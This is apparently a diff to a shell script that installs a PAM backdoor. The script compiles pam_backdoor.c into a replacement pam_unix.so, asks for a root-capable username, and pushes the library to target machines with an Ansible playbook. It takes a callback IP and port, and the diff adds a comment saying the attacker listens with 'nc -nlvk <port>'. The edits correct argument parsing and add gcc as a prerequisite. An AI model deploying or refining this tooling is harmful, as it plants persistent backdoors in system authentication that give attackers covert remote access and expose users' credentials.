@@ -7,17 +7,17 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Quit if correct arguments are not passed
-if [ "$#" -ne 3 ]; then
+if [ "$#" -ne 2 ]; then
     echo "Usage: $0 <Callback IP> <Callback Port>"
     exit 1
 fi
 
-ip=$2
-port=$3
+ip=$1
+port=$2
 
 # ensure prereqs are installed
-# ubuntu: libpam-modules libpam0g-dev
-# rhel: pam-devel
+# ubuntu: libpam-modules libpam0g-dev gcc
+# rhel: pam-devel gcc
 
 # Get username and password for ansible
 read -p "Enter username of user with root access on the target machines: " user
@@ -44,6 +44,8 @@ gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl
 
 # Run ansible playbook to setup
 ansible-playbook main.yml -t install
+
+# attacker runs nc -nlvk <port>
 
 # get OS version
 # os_version=$(cat /etc/*-release | grep "PRETTY_NAME" | sed 's/PRETTY_NAME=//g')
